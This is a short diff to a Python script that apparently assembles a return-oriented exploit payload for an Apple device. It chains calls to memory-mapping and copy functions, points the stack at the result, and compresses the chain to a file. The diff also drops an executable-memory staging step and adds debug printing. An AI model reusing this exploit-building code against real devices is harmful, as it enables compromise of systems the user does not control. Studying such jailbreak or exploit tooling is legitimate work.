@@ -2,6 +2,7 @@
 import sys, base64, shlex, zlib
 import dmini
 from world1 import *
+import goo
 
 if len(sys.argv) != 4:
     print >> sys.stderr, "usage: python catalog.py '-c cache' '-k kern' patchfile"
@@ -68,6 +69,7 @@ funcall('_vm_remap', mtss.pop(), thousandp, 0x1000, 1, 0, mtss.pop(), stub & ~0x
 funcall('_mlock', 0, 0x2000)
 funcall('_memcpy', 0x10000000, 0, 0x2000) # XXX
 
+plist = 'x'
 
 #funcall('_abort')
 dmini.cur.choose_file('/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
@@ -115,25 +117,13 @@ funcall('_vm_map', mtss.pop(), thousandp, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5
 
 funcall('_exit', 0)
 
-final = finalize(0x11000000 - 4)
-finalz = zlib.compress(final)
+final = finalize(0xfefe0000)
 
-init('R4', 'R7', 'PC')
+final = zlib.compress(final)
 
-PROT_READ, PROT_WRITE, PROT_EXEC = 4, 2, 1
-MAP_ANON, MAP_FIXED, MAP_SHARED = 0x1000, 0x0010, 1
-
-funcall('_mmap', 0x11000000, len(final), PROT_READ | PROT_WRITE, MAP_ANON | MAP_FIXED | MAP_SHARED, -1 % (2**32), 0, 0)
-
-dmini.cur.choose_file('/usr/lib/libz.dylib')
-funcall('_uncompress', 0x11000000, ptrI(len(final)), ptr(finalz), len(finalz))
-
-set_r0_to(ptr(''))
-
-set_sp_to(0x11000000)
-
-output = finalize(0xfefe0000)
+print 'len(final) = %d/1024' % len(final)
+print repr(goo.sheap)
 
 #heapdump(None)
-open('output.txt', 'w').write(output)
+open('output.txt', 'w').write(final)
 
